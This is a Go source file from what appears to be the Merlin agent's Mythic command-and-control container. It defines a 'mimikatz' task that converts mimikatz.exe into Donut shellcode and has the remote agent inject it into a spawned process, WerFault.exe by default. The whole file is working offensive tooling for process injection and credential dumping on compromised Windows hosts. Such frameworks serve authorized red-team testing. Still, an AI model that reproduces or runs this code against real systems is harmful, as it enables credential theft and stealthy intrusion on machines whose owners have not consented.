package commands

import (
	// Standard
	"bytes"
	"encoding/base64"
	"fmt"
	"os"
	"path"

	//3rd Party
	"github.com/Binject/go-donut/donut"

	// Mythic
	structs "github.com/MythicMeta/MythicContainer/agent_structs"
	"github.com/MythicMeta/MythicContainer/logging"

	// Merlin Message
	"github.com/Ne0nd0g/merlin-message/jobs"
)

// mimikatz returns a Mythic Command structure that is registered with the Mythic server
func mimikatz() structs.Command {
	attr := structs.CommandAttribute{
		SupportedOS: []string{structs.SUPPORTED_OS_WINDOWS},
	}

	mimiCommand := structs.CommandParameter{
		Name:                                    "arguments",
		ModalDisplayName:                        "arguments",
		CLIName:                                 "arguments",
		ParameterType:                           structs.COMMAND_PARAMETER_TYPE_STRING,
		Description:                             "A space separated list of Mimikatz arguments to execute. 'exit' will automatically be appended to the command",
		Choices:                                 nil,
		DefaultValue:                            "token::whoami",
		SupportedAgents:                         nil,
		SupportedAgentBuildParameters:           nil,
		ChoicesAreAllCommands:                   false,
		ChoicesAreLoadedCommands:                false,
		FilterCommandChoicesByCommandAttributes: nil,
		DynamicQueryFunction:                    nil,
		ParameterGroupInformation: []structs.ParameterGroupInfo{
			{
				ParameterIsRequired:   true,
				GroupName:             "Default",
				UIModalPosition:       0,
				AdditionalInformation: nil,
			},
		},
	}

	spawnto := structs.CommandParameter{
		Name:                                    "spawnto",
		ModalDisplayName:                        "SpawnTo",
		CLIName:                                 "spawnto",
		ParameterType:                           structs.COMMAND_PARAMETER_TYPE_STRING,
		Description:                             "The child process that will be started to execute Mimikatz in",
		Choices:                                 nil,
		DefaultValue:                            "C:\\Windows\\System32\\WerFault.exe",
		SupportedAgents:                         nil,
		SupportedAgentBuildParameters:           nil,
		ChoicesAreAllCommands:                   false,
		ChoicesAreLoadedCommands:                false,
		FilterCommandChoicesByCommandAttributes: nil,
		DynamicQueryFunction:                    nil,
		ParameterGroupInformation: []structs.ParameterGroupInfo{
			{
				ParameterIsRequired:   true,
				GroupName:             "Default",
				UIModalPosition:       2,
				AdditionalInformation: nil,
			},
		},
	}

	spawntoArgs := structs.CommandParameter{
		Name:                                    "spawntoargs",
		ModalDisplayName:                        "SpawnTo Arguments",
		CLIName:                                 "spawntoargs",
		ParameterType:                           structs.COMMAND_PARAMETER_TYPE_STRING,
		Description:                             "arguments to create the spawnto process with, if any",
		Choices:                                 nil,
		DefaultValue:                            "",
		SupportedAgents:                         nil,
		SupportedAgentBuildParameters:           nil,
		ChoicesAreAllCommands:                   false,
		ChoicesAreLoadedCommands:                false,
		FilterCommandChoicesByCommandAttributes: nil,
		DynamicQueryFunction:                    nil,
		ParameterGroupInformation: []structs.ParameterGroupInfo{
			{
				ParameterIsRequired:   false,
				GroupName:             "Default",
				UIModalPosition:       3,
				AdditionalInformation: nil,
			},
		},
	}

	command := structs.Command{
		Name:                  "mimikatz",
		NeedsAdminPermissions: false,
		HelpString:            "mimikatz <mimikatz command> <spawnto> <spawnto args>",
		Description: "Converts mimikatz.exe into shellcode with Donut, executes it in the SpawnTo " +
			"process, and returns the output. The Mimikatz 'exit' command is automatically appended to the command string",
		Version:                        0,
		SupportedUIFeatures:            []string{},
		Author:                         "@Ne0nd0g",
		MitreAttackMappings:            []string{"T1055"},
		ScriptOnlyCommand:              false,
		CommandAttributes:              attr,
		CommandParameters:              []structs.CommandParameter{mimiCommand, spawnto, spawntoArgs},
		AssociatedBrowserScript:        nil,
		TaskFunctionOPSECPre:           nil,
		TaskFunctionCreateTasking:      mimikatzCreateTask,
		TaskFunctionProcessResponse:    nil,
		TaskFunctionOPSECPost:          nil,
		TaskFunctionParseArgString:     taskFunctionParseArgString,
		TaskFunctionParseArgDictionary: taskFunctionParseArgDictionary,
		TaskCompletionFunctions:        nil,
	}
	return command
}

func mimikatzCreateTask(task *structs.PTTaskMessageAllData) (resp structs.PTTaskCreateTaskingMessageResponse) {
	pkg := "mythic/container/commands/mimikatz/mimikatzCreateTask()"
	resp.TaskID = task.Task.ID

	filePath := path.Join("/", "opt", "mimikatz.exe")
	data, err := os.ReadFile(filePath) // #nosec G304 - this is a static filepath that does not take user input
	if err != nil {
		err = fmt.Errorf("%s: there was an error reading the file from %s: %s", pkg, filePath, err)
		resp.Error = err.Error()
		resp.Success = false
		logging.LogError(err, "returning with error")
		return
	}

	// Arguments
	var arguments string
	arguments, err = task.Args.GetStringArg("arguments")
	if err != nil {
		err = fmt.Errorf("%s: there was an error getting the 'arguments' command argument: %s", pkg, err)
		resp.Error = err.Error()
		resp.Success = false
		logging.LogError(err, "returning with error")
		return
	}
	arguments += " exit"

	// SpawnTo
	var spawnto string
	spawnto, err = task.Args.GetStringArg("spawnto")
	if err != nil {
		err = fmt.Errorf("%s: there was an error getting the 'spawnto' command argument: %s", pkg, err)
		resp.Error = err.Error()
		resp.Success = false
		logging.LogError(err, "returning with error")
		return
	}

	// SpawnTo Args
	var spawntoargs string
	spawntoargs, err = task.Args.GetStringArg("spawntoargs")
	if err != nil {
		err = fmt.Errorf("%s: there was an error getting the 'spawntoargs' command argument: %s", pkg, err)
		resp.Error = err.Error()
		resp.Success = false
		logging.LogError(err, "returning with error")
		return
	}

	// Donut Config
	config := donut.DefaultConfig()
	config.Arch = donut.X84
	config.Type = donut.DONUT_MODULE_EXE
	config.ExitOpt = 2
	config.Entropy = 3
	config.Parameters = arguments
	config.Verbose = false

	// Get the PE and turn it into a *bytes.buffer
	buff := bytes.NewBuffer(data)
	var shellcode *bytes.Buffer
	shellcode, err = donut.ShellcodeFromBytes(buff, config)
	if err != nil {
		err = fmt.Errorf("%s: there was an error generating the shellcode from Donut: %s", pkg, err)
		resp.Error = err.Error()
		resp.Success = false
		logging.LogError(err, "returning with error")
		return
	}

	//  Merlin Job
	// Command: createprocess
	// Arguments:
	// 1. File contents as Base64 string
	// 2. SpawnTo executable file path on host where the Agent is running
	// 3. SpawnTo arguments

	job := jobs.Command{
		Command: "createprocess",
		Args:    []string{base64.StdEncoding.EncodeToString(shellcode.Bytes()), spawnto, spawntoargs},
	}

	mythicJob, err := ConvertMerlinJobToMythicTask(job, jobs.MODULE)
	if err != nil {
		err = fmt.Errorf("%s: %s", pkg, err)
		resp.Error = err.Error()
		resp.Success = false
		logging.LogError(err, "returning with error")
		return
	}

	task.Args.SetManualArgs(mythicJob)

	disp := fmt.Sprintf(" %s, SpawnTo: %s, SpawnTo Arguments: %s", arguments, spawnto, spawntoargs)
	resp.DisplayParams = &disp
	resp.Success = true
	return
}
